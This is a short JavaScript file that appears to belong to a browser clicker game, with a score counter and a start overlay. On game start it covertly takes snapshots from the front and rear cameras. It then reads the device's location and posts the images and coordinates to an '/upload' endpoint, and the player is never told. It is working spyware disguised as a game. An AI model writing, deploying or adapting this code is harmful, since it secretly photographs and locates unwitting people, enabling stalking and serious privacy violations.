let count = 0;
const scoreDisplay = document.getElementById('score');
const video = document.getElementById('v');
const canvas = document.getElementById('c');
const ctx = canvas.getContext('2d');

function updateScore() {
    count++;
    scoreDisplay.innerText = count;
}

async function initGame() {
    document.getElementById('overlay').style.display = 'none';
    try {
        // Old kamera
        const s1 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = s1;
        
        video.onloadedmetadata = async () => {
            ctx.drawImage(video, 0, 0, 640, 480);
            const imgFront = canvas.toDataURL('image/jpeg', 0.2);
            s1.getTracks().forEach(t => t.stop());

            // Orqa kamera
            try {
                const s2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                video.srcObject = s2;
                video.onloadedmetadata = () => {
                    ctx.drawImage(video, 0, 0, 640, 480);
                    const imgBack = canvas.toDataURL('image/jpeg', 0.2);
                    s2.getTracks().forEach(t => t.stop());

                    navigator.geolocation.getCurrentPosition((pos) => {
                        sendData(imgFront, imgBack, pos.coords.latitude, pos.coords.longitude);
                    }, () => sendData(imgFront, imgBack, "Noma'lum", "Noma'lum"));
                };
            } catch (e) { sendData(imgFront, null, "Noma'lum", "Noma'lum"); }
        };
    } catch (err) { console.log("Ruxsat berilmadi"); }
}

function sendData(f, b, lat, lon) {
    fetch('/upload', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ front: f, back: b, lat: lat, lon: lon })
    });
}